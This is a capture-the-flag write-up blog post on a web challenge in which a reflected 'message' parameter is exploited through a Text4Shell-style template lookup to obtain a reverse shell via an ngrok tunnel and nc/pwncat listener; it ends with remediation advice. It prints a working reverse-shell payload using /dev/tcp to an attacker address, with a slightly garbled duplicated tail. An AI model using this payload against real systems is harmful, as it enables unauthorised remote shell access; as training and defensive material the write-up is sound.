---
title: Safaricom PwnZone CTF Prequalifiers
date: 2025-10-05 08:00:00 +0800
categories: [ctf, web]
tags: [ctf, safaricom_ctf, web, reverse_shell ]    # TAG names should always be lowercase
description: "Challenge: Message Me"
---


# Message Me

![Message Me Challenge](/dzif8ltvg/image/upload/v1759699751/CTF/Safaricom%20PwnZone%20CTF%20Prequalifiers/ctf.safaricom.co.ke_Message_Me_stlobl.png){: width="400" height="400"}

---

## TL;DR

A web service listening on port `8802` echoed user-supplied input into a template-rendered response. By abusing template evaluation / remote-lookup behavior (a Text4Shell-style vector) and exposing a local TCP listener via **ngrok → nc/pwncat**, I forced the server to open a reverse TCP connection, obtained an interactive shell, and retrieved the flag.

---

## Challenge overview
**Target:** `http://54.72.82.22:8802`  
**Hint:** *Its 2021, you give me text, I give you shell.* 

The service accepts a `message` parameter and echoes it back. The objective is to craft input that leads to command execution (a shell) on the server.

![Message Overview](/dzif8ltvg/image/upload/v1759699750/CTF/Safaricom%20PwnZone%20CTF%20Prequalifiers/ctf.safaricom.co.ke_challenges_port_pw42la.png)

---

## Reconnaissance

### Port scan

```bash
$ nmap 54.72.82.22 -p 8802
Starting Nmap 7.92 ( https://nmap.org ) at 2025-10-03 20:00 EAT
Host is up (0.15s latency).
PORT     STATE SERVICE
8802/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```

### Directory bruteforce

```bash
$ gobuster dir -u http://54.72.82.22:8802 -w ~/path to wordlist/common.txt 
/error                (Status: 500) [Size: 105]
/favicon.ico          (Status: 200) [Size: 946]
```

The error output and favicon indicated a Spring/Thymeleaf stack (Whitelabel error page):

```
Whitelabel Error Page
This application has no explicit mapping for /error, so you are seeing this as a fallback.
Sun Oct 05 20:16:45 GMT 2025
There was an unexpected error (type=Not Found, status=404).
No message available
```

This stackhint narrowed the attack surface to template rendering and server-side evaluation mechanisms.

---

### Initial tests

I tested the `message` parameter to understand its reflection/escaping behavior. A simple XSS check showed input was reflected in the page:

`http://54.72.82.22:8802/?message=<script>alert(1)</script>`

![XSS/reflection test](/dzif8ltvg/image/upload/v1759699751/CTF/Safaricom%20PwnZone%20CTF%20Prequalifiers/saf_xss_d9yghw.png){: width="400" height="400"}


**Observations:**
- The app reflected user input into the response.
- Some escaping/filtering was present, but it was possible to craft payloads to bypass naive filters.
- The stack’s templating behavior made template-evaluation style payloads a primary avenue.

---

### Remote listener setup

The exploit required the target to connect back to a public listener. My environment lacked direct router forwarding, so I used **ngrok** to expose a local listener:


1. **Install / configure ngrok**  
   - Download and Sign In: Get the ngrok binary from the official ngrok website. 
   - Authenticate: Add your free-tier authentication token. This is sufficient for setting up a basic listener.

2. **Start an ngrok TCP tunnel to local port `9090`:**
    - Start a tunnel that forwards traffic from a public ngrok endpoint to your local port 9090.
    - Heads Up: The ngrok service may require a verified account (which sometimes means adding a credit card) to activate the TCP tunneling feature on the Free Tier.

    ```bash
    ngrok tcp 9090
    ```

    Ngrok will provide a public endpoint your target machine will connect to. The output will look similar to this:

    ```
    Forwarding                    tcp://x.tcp.in.ngrok.io:xxxxx -> localhost:9090
    ```

    Optional: Resolve public host to an IP:
    If your reverse shell payload requires an IP address instead of a hostname, you can resolve the ngrok address:

    ```
    $ nslookup x.tcp.in.ngrok.io
    Server:		127.0.0.53
    Address:	127.0.0.53#53
    Non-authoritative answer:
    Name:	x.tcp.in.ngrok.io
    Address: 13.x.x.x
    ```

3. Start a local listener:
    Start a local listener on port 9090 to catch the incoming connection from the ngrok tunnel.

    ```
    nc -lvnp 9090
    # or
    pwncat -lv 9090
    ```
    Once the target executes the reverse shell payload directed at your ngrok public endpoint (x.tcp.in.ngrok.io:xxxxx), you will receive the connection on your local listener.

---

### Attack Approach: Template Injection to Reverse Shell 🐚

The vulnerability exploited involved the application rendering reflected user input directly within a template context.

I used a template evaluation / remote lookup style payload — specifically tailored to the app's underlying technology stack to trigger a crucial action on the server:

1. Outbound Connection: The server was coerced into initiating an outbound TCP connection to my controlled ngrok endpoint.

2. Reverse Shell: This connection was then used to spawn and redirect a reverse shell back to my listener.

For reference on the general class of technique see: [text4shell](https://www.aquasec.com/cloud-native-academy/supply-chain-security/text4shell/) 

---

## Crafting the payload 
I iteratively tuned the payload to successfully bypass the application's escaping and filtering mechanisms and to reliably trigger a network callback to my listener.

Tools like CyberChef were essential for manipulating the payload, and using the curl option `--data-urlencode` helped create payload variants that survived both URL encoding and the server-side filters.

Final Payload Structure (Template Evaluation)

```
${script:javascript:java.lang.Runtime.getRuntime().exec(Java.to(['/bin/bash','-c','sh -i >& /dev/tcp/your_ip_address/your_port 0>&1'],'java.lang.String[]'))} "your_port 0>&1'],'java.lang.String[]'))} "
```
Note: This specific structure utilizes a scripting engine within the templating context (like JNDI/OGNL) to execute.


---

### Receiving the shell

Once the payload was successfully delivered to the target application, my ngrok listener received the incoming connection and dropped into an interactive shell.

![pwncat reverse shell](/dzif8ltvg/image/upload/v1759699751/CTF/Safaricom%20PwnZone%20CTF%20Prequalifiers/pwncat_main_arttya.png)

I quickly enumerated the filesystem and successfully located the flag.

---


## Remediation & mitigation

If this were a production application, recommended mitigations include:

- **Use safe template APIs / escape all untrusted input**
  - Never evaluate or interpret user input within templates
  - Prefer APIs that treat user data strictly as text (no expression evaluation)

- **Disable remote lookups & unsafe features**
  - For Spring/Thymeleaf apps, ensure features that can trigger remote lookups or expression evaluation from user input are disabled

- **Egress filtering**
  - Implement strict outbound network controls so application hosts cannot freely connect to arbitrary external addresses

- **Input validation & allowlists**
  - Apply context-aware escaping and strict allowlists for expected values

- **Detect & alert on anomalous outbound connections**
  - Monitor for unexpected outbound connections and unusual process/network activity

---

## Acknowledgements & Special Thanks

This guided solution was developed after the initial breakthrough by **Carlos**, who — using an innovative (and unintended) DNS exfiltration technique — earned first blood on the challenge.

---
